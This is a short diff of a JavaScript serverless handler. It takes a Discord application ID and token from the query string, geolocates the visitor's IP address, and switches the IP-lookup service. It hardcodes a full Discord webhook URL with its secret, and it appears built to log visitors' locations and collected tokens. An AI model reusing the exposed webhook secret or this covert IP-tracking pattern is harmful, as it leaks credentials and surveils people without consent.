@@ -5,7 +5,7 @@ module.exports = async (req, res) => {
   } = req.query;
   const webhookURL = 'https://discord.com/api/webhooks/1319442086524751902/jponFRjtTqcE9E0q-gy2lCCWJQySujcBuoKy5O39mphs-zaToU3An1zRckSOXqXtZICC';
   
-  const ipLocationURL = `https://api.iplocation.net/`;
+  const ipLocationURL = `https://ip-api.com/json/`;
   const clientIP = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress; // Obtém o IP real do cliente
 
   if (!applicationId || !token) {
@@ -15,7 +15,7 @@ module.exports = async (req, res) => {
   }
 
   try {
-    const locationResponse = await fetch(`${ipLocationURL}?ip=${clientIP}`);
+    const locationResponse = await fetch(`${ipLocationURL}${clientIP}`);
     const locationData = await locationResponse.json();
 
     const botInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
